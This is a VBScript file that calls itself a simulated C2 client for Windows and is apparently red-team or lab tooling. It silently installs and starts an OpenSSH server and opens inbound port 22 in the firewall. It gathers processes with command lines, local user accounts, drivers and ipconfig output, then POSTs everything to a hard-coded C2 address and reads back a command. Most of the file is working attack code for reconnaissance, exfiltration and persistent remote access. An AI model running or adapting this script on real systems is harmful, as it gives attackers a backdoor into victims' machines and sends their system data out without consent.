' VBScript to simulate a C2 client + collect processes, users, drivers
Option Explicit

Dim http, wShell, network, url, response
Dim computerName, userName, postData, ipconfigProcess, ipconfigOutput
Dim fso, net, svc
Dim openSSHInstallResult

' ---------- Init ----------
Set http    = CreateObject("MSXML2.ServerXMLHTTP")
Set wShell  = CreateObject("WScript.Shell")
Set network = CreateObject("WScript.Network")
Set fso     = CreateObject("Scripting.FileSystemObject")
Set net     = CreateObject("WScript.Network")
Set svc     = GetObject("winmgmts:\\.\root\cimv2")

' ---------- Check and Enforce Admin Privileges ----------
Function EnsureAdmin()
    Dim shell, exec, testCmd, isAdmin
    On Error Resume Next
    Set shell = CreateObject("WScript.Shell")
    ' Test if running as admin by trying to access a restricted registry key
    testCmd = shell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA")
    If Err.Number = 0 Then
        isAdmin = True
    Else
        isAdmin = False
        Err.Clear
    End If
    If Not isAdmin Then
        ' Relaunch script with admin privileges
        Set shell = CreateObject("Shell.Application")
        shell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 1
        WScript.Quit
    End If
    EnsureAdmin = isAdmin
    On Error GoTo 0
End Function

' Install OpenSSH Server and capture result
On Error Resume Next
wShell.Run "powershell.exe -Command ""Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0""", 0, True
If Err.Number = 0 Then
    openSSHInstallResult = "OpenSSH Server: Installation successful"
Else
    openSSHInstallResult = "OpenSSH Server: Installation failed (" & Err.Description & ")"
End If
On Error GoTo 0

' ---------- Open SSH Port (Firewall Rule) ----------
Dim openSSHFirewallResult
On Error Resume Next
wShell.Run "powershell.exe -Command ""New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (TCP-In)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22""", 0, True
If Err.Number = 0 Then
    openSSHFirewallResult = "OpenSSH Firewall: Rule created successfully"
Else
    openSSHFirewallResult = "OpenSSH Firewall: Failed to create rule (" & Err.Description & ")"
End If
On Error GoTo 0

' ---------- Check and Start OpenSSH Server ----------
Function CheckOpenSSHStatus()
    Dim sshStatus, exec, output, enableResult, startResult
    On Error Resume Next
    ' Check if sshd service exists and get its status
    Set exec = wShell.Exec("powershell.exe -Command ""Get-Service sshd | Select-Object -ExpandProperty Status""")
    Do While exec.Status = 0
        WScript.Sleep 100
    Loop
    output = exec.StdOut.ReadAll
    If Err.Number <> 0 Or Trim(output) = "" Then
        CheckOpenSSHStatus = "OpenSSH Server: Not installed or error checking status (" & Err.Description & ")"
    Else
        sshStatus = Trim(output)
        If LCase(sshStatus) = "stopped" Then
            ' Enable service (set to Automatic)
            wShell.Run "powershell.exe -Command ""Set-Service -Name sshd -StartupType Automatic""", 0, True
            If Err.Number = 0 Then
                enableResult = "OpenSSH Server: Enabled (set to Automatic)"
            Else
                enableResult = "OpenSSH Server: Failed to enable (" & Err.Description & ")"
            End If
            Err.Clear
            ' Start service
            wShell.Run "powershell.exe -Command ""Start-Service sshd""", 0, True
            If Err.Number = 0 Then
                startResult = "OpenSSH Server: Started successfully"
            Else
                startResult = "OpenSSH Server: Failed to start (" & Err.Description & ")"
            End If
            Err.Clear
            ' Recheck status after attempting to start
            Set exec = wShell.Exec("powershell.exe -Command ""Get-Service sshd | Select-Object -ExpandProperty Status""")
            Do While exec.Status = 0
                WScript.Sleep 100
            Loop
            output = exec.StdOut.ReadAll
            If Err.Number = 0 And Trim(output) <> "" Then
                sshStatus = Trim(output)
            Else
                sshStatus = "Error rechecking status (" & Err.Description & ")"
            End If
            CheckOpenSSHStatus = "OpenSSH Server: Initial status was Stopped" & vbCrLf & _
                                 enableResult & vbCrLf & _
                                 startResult & vbCrLf & _
                                 "OpenSSH Server: Current status is " & sshStatus
        Else
            CheckOpenSSHStatus = "OpenSSH Server: Current status is " & sshStatus
        End If
    End If
    On Error GoTo 0
End Function

' ---------- Helpers ----------
Function Safe(s)
  On Error Resume Next
  If IsNull(s) Or IsEmpty(s) Then
    Safe = ""
  Else
    Safe = CStr(s)
  End If
End Function

Function JoinLines(arr, sep)
  Dim i, out : out = ""
  If IsArray(arr) Then
    For i = 0 To UBound(arr)
      If i > 0 Then out = out & sep
      out = out & arr(i)
    Next
  End If
  JoinLines = out
End Function

Function Header(t)
  Header = "===== " & t & " =====" & vbCrLf
End Function

' ---------- Collectors ----------
' Processes
Function CollectProcesses()
  Dim col, p, lines(), idx
  idx = -1
  On Error Resume Next
  Set col = svc.ExecQuery("SELECT ProcessId,Name,CommandLine,ExecutablePath FROM Win32_Process")
  For Each p In col
    idx = idx + 1
    ReDim Preserve lines(idx)
    lines(idx) = "PID=" & Safe(p.ProcessId) & _
                 "  Name=" & Safe(p.Name) & _
                 "  Path=" & Safe(p.ExecutablePath) & _
                 "  Cmd=" & Safe(p.CommandLine)
  Next
  CollectProcesses = Header("PROCESSES") & JoinLines(lines, vbCrLf) & vbCrLf
End Function

' Local Users
Function CollectUsers()
  Dim col, u, lines(), idx
  idx = -1
  On Error Resume Next
  Set col = svc.ExecQuery("SELECT Name,Disabled,Lockout,PasswordRequired FROM Win32_UserAccount WHERE LocalAccount=True")
  For Each u In col
    idx = idx + 1
    ReDim Preserve lines(idx)
    lines(idx) = "User=" & Safe(u.Name) & _
                 "  Disabled=" & Safe(u.Disabled) & _
                 "  Locked=" & Safe(u.Lockout) & _
                 "  PwReq=" & Safe(u.PasswordRequired)
  Next
  CollectUsers = Header("LOCAL USERS") & JoinLines(lines, vbCrLf) & vbCrLf
End Function

' Drivers (system/kernel services)
Function CollectDrivers()
  Dim col, d, lines(), idx
  idx = -1
  On Error Resume Next
  Set col = svc.ExecQuery("SELECT Name,State,StartMode,PathName FROM Win32_SystemDriver")
  For Each d In col
    idx = idx + 1
    ReDim Preserve lines(idx)
    lines(idx) = "Name=" & Safe(d.Name) & _
                 "  State=" & Safe(d.State) & _
                 "  StartMode=" & Safe(d.StartMode) & _
                 "  Path=" & Safe(d.PathName)
  Next
  CollectDrivers = Header("SYSTEM DRIVERS") & JoinLines(lines, vbCrLf) & vbCrLf
End Function

' ---------- ipconfig (your original) ----------
Set ipconfigProcess = wShell.Exec("ipconfig /all")
Do While ipconfigProcess.Status = 0
  WScript.Sleep 100
Loop
ipconfigOutput = ipconfigProcess.StdOut.ReadAll

' ---------- Build body ----------
computerName = network.ComputerName
userName = network.UserName

postData = ""
postData = postData & Header("HOST INFO")
postData = postData & "computer=" & computerName & vbCrLf
postData = postData & "user=" & userName & vbCrLf & vbCrLf

postData = postData & Header("OPENSSH STATUS")
postData = postData & openSSHInstallResult & vbCrLf
postData = postData & openSSHFirewallResult & vbCrLf
postData = postData & CheckOpenSSHStatus() & vbCrLf & vbCrLf

postData = postData & Header("IPCONFIG") & ipconfigOutput & vbCrLf
postData = postData & CollectProcesses() & vbCrLf
postData = postData & CollectUsers() & vbCrLf
postData = postData & CollectDrivers() & vbCrLf

' ---------- C2 URL ----------
url = "http://10.100.3.103:8080/command.txt"  ' adjust as needed

' ---------- Send ----------
On Error Resume Next
http.Open "POST", url, False
http.setRequestHeader "Content-Type", "text/plain"
http.Send postData

' ---------- Response handling ----------
If Err.Number = 0 And http.Status = 200 Then
  response = http.responseText
  WScript.Echo "Connected to C2! Command received: " & response
  If LCase(Trim(response)) = "whoami" Then
    WScript.Echo "Executing command: whoami"
    WScript.Echo "Result: " & userName & "@" & computerName
  Else
    WScript.Echo "Unknown command: " & response
  End If
Else
  WScript.Echo "Error connecting: HTTP " & http.Status & " - " & Err.Description
End If

' ---------- Cleanup ----------
Set svc = Nothing
Set net = Nothing
Set fso = Nothing
Set network = Nothing
Set wShell = Nothing
Set http = Nothing
Set ipconfigProcess = Nothing
